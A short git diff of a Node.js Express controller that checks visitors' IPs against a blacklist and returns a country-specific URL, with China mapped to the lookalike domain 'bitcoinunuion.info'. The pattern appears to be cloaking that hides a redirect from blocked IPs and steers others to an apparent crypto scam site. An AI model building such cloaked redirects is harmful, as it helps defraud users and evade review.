@@ -10,12 +10,11 @@ module.exports.getUrl = async function (req, res) {
     });
     try {
         await userAgent.save()
-        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-        const blackIp = await Ip.findOne({ip: ip})
+        const blackIp = await Ip.findOne({ip: req.ip})
         if (blackIp) {
             res.status(200).json(false)
         } else {
-            let url = checkCountry(ip)
+            let url = checkCountry(req.ip)
             res.status(200).json({status: true,
             url: url})
         }
@@ -26,8 +25,7 @@ module.exports.getUrl = async function (req, res) {
 }
 
 function checkCountry(ip) {
-    // let geo = geoip.lookup(ip);
-    let geo = geoip.lookup("207.97.227.239");
+    let geo = geoip.lookup(ip);
     switch (geo.country) {
         case "CN":
             return url = 'bitcoinunuion.info'
